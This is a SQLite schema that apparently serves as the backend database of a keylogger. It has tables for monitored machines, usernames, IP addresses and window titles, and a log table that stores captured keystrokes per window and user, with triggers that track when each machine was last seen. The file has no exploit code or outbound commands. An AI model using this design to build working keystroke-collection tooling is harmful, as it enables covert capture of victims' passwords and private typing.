
CREATE TABLE IF NOT EXISTS machines(
	id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
	guid TEXT NOT NULL,
	created_at INTEGER DEFAULT (strftime('%s', 'now')),
	last_seen INTEGER DEFAULT (strftime('%s', 'now')),
	
	CONSTRAINT valid_guid CHECK(length(guid) >= 1)
);

CREATE TABLE IF NOT EXISTS users(
	id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
	username TEXT NOT NULL,
	machine_id INTEGER NOT NULL,
	created_at INTEGER DEFAULT (strftime('%s', 'now')),
	last_seen  INTEGER DEFAULT (strftime('%s', 'now')),
	
	UNIQUE(username, machine_id),
	
	FOREIGN KEY(machine_id) REFERENCES machines(id) ON DELETE CASCADE,
	CONSTRAINT valid_username CHECK(length(username) >= 1 AND length(username) <= 20)
);

CREATE TABLE IF NOT EXISTS ip_addresses(
	id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
	ipv4 TEXT NOT NULL,
	
	UNIQUE(ipv4)
	CONSTRAINT valid_ipv4 CHECK(ipv4 like '%.%.%.%')
);

CREATE TABLE IF NOT EXISTS windows(
	id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
	name TEXT NOT NULL,
	class TEXT NOT NULL,
	process TEXT NOT NULL,
	UNIQUE (name, process, class),
	
	
	CONSTRAINT valid_window_name CHECK(length(name) <= 32767),
	CONSTRAINT valid_window_class CHECK(length(class) >= 1 AND length(class) <= 256),
	CONSTRAINT valid_process_name CHECK(length(process) >= 1 and length(process) <= 32767)

);

CREATE TABLE IF NOT EXISTS logs(
	id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
	keystrokes BLOB NOT NULL,
	timestamp INT NOT NULL,
	
	user_id INTEGER NOT NULL,
	machine_id INTEGER NOT NULL,
	window_id INTEGER NOT NULL,
	ip_id INTEGER,
	UNIQUE(timestamp, machine_id, user_id, window_id),
	
	FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
	FOREIGN KEY (machine_id) REFERENCES machines(id) ON DELETE CASCADE,
	FOREIGN KEY (window_id) REFERENCES windows(id) ON DELETE CASCADE,
	
	FOREIGN KEY (ip_id) REFERENCES ip_addresses(id) ON DELETE SET NULL

);

CREATE TABLE IF NOT EXISTS machines_ips(
	id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
	machine_id INTEGER NOT NULL,
	ip_id INTEGER NOT NULL,
	
	UNIQUE(machine_id, ip_id),
	
	FOREIGN KEY (machine_id) REFERENCES machines(id) ON DELETE CASCADE,
	FOREIGN KEY (ip_id) REFERENCES ip_addresses(id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_user_time
ON logs(user_id, timestamp);

CREATE INDEX IF NOT EXISTS idx_machine_guid
ON machines(guid);

CREATE INDEX IF NOT EXISTS idx_username
ON users(username);

CREATE INDEX IF NOT EXISTS idx_ipv4
ON ip_addresses(ipv4);



CREATE TRIGGER IF NOT EXISTS update_machine_last_seen
AFTER INSERT ON logs
BEGIN
	UPDATE machines
	SET last_seen = NEW.timestamp
	WHERE id = NEW.machine_id;
END;

CREATE TRIGGER IF NOT EXISTS update_user_last_seen
AFTER INSERT ON logs
BEGIN
	UPDATE users
	SET last_seen = NEW.timestamp
	WHERE 
		id = NEW.user_id AND
		machine_id = NEW.machine_id
	;
		
END;

